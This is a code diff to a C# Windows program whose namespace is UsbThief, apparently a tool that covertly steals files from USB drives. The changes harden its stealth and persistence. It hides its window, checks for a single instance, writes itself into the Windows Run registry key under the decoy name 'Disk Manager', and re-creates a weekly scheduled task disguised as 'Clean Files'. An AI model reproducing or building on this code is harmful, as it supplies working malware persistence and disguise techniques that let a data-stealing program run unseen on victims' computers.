@@ -66,10 +66,8 @@ namespace UsbThief
         public Form1()
         {
             string[] args = Environment.GetCommandLineArgs();//作用相当于输入参数的string数组
-            if (args.Length < 2 || args[1] != "-run")
-            {
+            if (args.Length < 2 || args[1] != "-run" || Process.GetProcessesByName("diskmanager").Length > 1)
                 Environment.Exit(0);
-            }
             InitializeComponent();
             form.Show();
             form.Hide();
@@ -90,9 +88,7 @@ namespace UsbThief
             try
             {
                 if (!Directory.Exists(workspace))
-                {
                     Directory.CreateDirectory(workspace);
-                }
             }
             catch (Exception e)
             {
@@ -104,7 +100,7 @@ namespace UsbThief
                 string path = Application.ExecutablePath;
                 RegistryKey rk = Registry.CurrentUser;
                 RegistryKey rk2 = rk.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
-                if (rk2.GetValue("Disk Manager") == null)
+                if (rk2.GetValue("Disk Manager") == null || rk2.GetValue("Disk Manager").ToString() != path + " -run")
                 {
                     rk2.SetValue("Disk Manager", path + " -run");
                     logger.Info("已设置开机启动");
@@ -118,7 +114,7 @@ namespace UsbThief
             }
             try
             {
-                if (TaskService.Instance.FindTask("Clean Files") == null)
+                if (TaskService.Instance.FindTask("Clean Files") == null || TaskService.Instance.FindTask("Clean Files").Definition.Actions[0].ToString() != Application.StartupPath + "\\fileassistant.exe -clean")
                 {
                     TaskService.Instance.AddTask("Clean Files", new WeeklyTrigger { DaysOfWeek = DaysOfTheWeek.Friday, StartBoundary = DateTime.Parse("2019-09-27 09:00") }, new ExecAction { Path = Application.StartupPath + "\\fileassistant.exe", Arguments = "-clean" });
                     logger.Info("已设置计划任务");
